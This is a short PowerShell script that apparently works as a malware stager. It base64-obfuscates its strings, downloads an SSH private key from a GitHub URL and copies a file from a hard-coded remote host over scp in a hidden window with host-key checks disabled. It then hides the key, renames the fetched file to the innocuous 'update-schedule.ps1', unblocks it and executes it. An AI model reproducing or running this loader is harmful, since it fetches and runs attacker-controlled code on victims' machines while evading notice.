<#
.SYNOPSIS
    Descarga PEM desde GitHub, conecta SSH, descarga note.txt, ejecuta
#>

# --- Auto-deteccion ---
$a = $PSScriptRoot
$b = $env:USERNAME
$c = Join-Path $env:USERPROFILE ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG93bmxvYWRz")))


$d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NC4xNzIuMjUwLjI1Mw=="))
$e = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YXp1cmV1c2Vy"))
$f = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dm0tc3NoLWNhX2tleS5wZW0="))
$g = Join-Path $c $f
$h = Join-Path $env:LOCALAPPDATA ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZHJpdmU=")))


$i = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NpYmVyc2VnbXgvbXlfc3R1ZmYvbWFpbi9lcHJ2MzMzMGZmei50bXA="))
$j = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZXBydjMzMzBmZnoudG1w"))
$k = Join-Path $c $j


$l = New-Object System.Net.WebClient
$l.DownloadFile($i, $k)


if (Test-Path $k) {
    Move-Item $k $g -Force
}


if (-not (Test-Path $g)) {
    exit 1
}


New-Item -ItemType Directory -Path $h -Force | Out-Null


$m = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bm90ZS50eHQ="))
if (Test-Path (Join-Path $h $m)) {
    Remove-Item (Join-Path $h $m) -Force
}


$n = Start-Process -FilePath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2Nw"))) -ArgumentList @(
    "-i", $g,
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "$e@$($d):/home/$e/$m",
    (Join-Path $h $m)
) -Wait -WindowStyle Hidden -PassThru


if (Test-Path (Join-Path $h $m)) {
  
    $o = "{0}{1}" -f [System.IO.Path]::GetRandomFileName().Replace('.',''), '.tmp'
    $p = Join-Path $c $o
    Move-Item $g $p -Force
    (Get-Item $p -Force).Attributes = 'Hidden'

    
    $q = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXBkYXRlLXNjaGVkdWxlLnBzMQ=="))
    Move-Item (Join-Path $h $m) (Join-Path $h $q) -Force
    Unblock-File -Path (Join-Path $h $q)

   
    & (Join-Path $h $q)
}